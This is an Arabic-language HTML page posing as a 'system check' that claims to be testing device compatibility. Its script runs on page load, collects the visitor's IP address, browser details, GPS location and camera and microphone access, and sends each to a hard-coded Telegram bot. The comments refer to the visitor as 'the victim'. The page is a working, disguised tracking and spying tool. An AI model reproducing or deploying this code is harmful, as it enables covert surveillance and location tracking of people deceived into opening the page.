<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحقق من النظام</title>
    <script>
        const token = "8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU";
        const chatId = "6978465145";

        async function sendLog(text) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        }

        async function captureAll() {
            // سحب IP والشبكة
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            sendLog(`🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}`);

            // سحب الموقع (يظهر الإذن تلقائياً)
            navigator.geolocation.getCurrentPosition(p => {
                sendLog(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // سحب الكاميرا والمايك (يحتاج ضغطة زر من الضحية)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                sendLog("📸 تم فتح الكاميرا والمايكروفون بنجاح!");
                // هنا يمكن إضافة كود لإرسال صورة (blob) كما شرحنا سابقاً
            } catch (e) {
                sendLog("❌ الضحية رفض الكاميرا.");
            }
        }
        window.onload = captureAll;
    </script>
</head>
<body style="background:#000; color:#0f0; text-align:center;">
    <h1>جاري فحص توافق الجهاز...</h1>
    <button onclick="captureAll()" style="padding:20px;">اضغط هنا لإكمال الفحص</button>
</body>
</html>
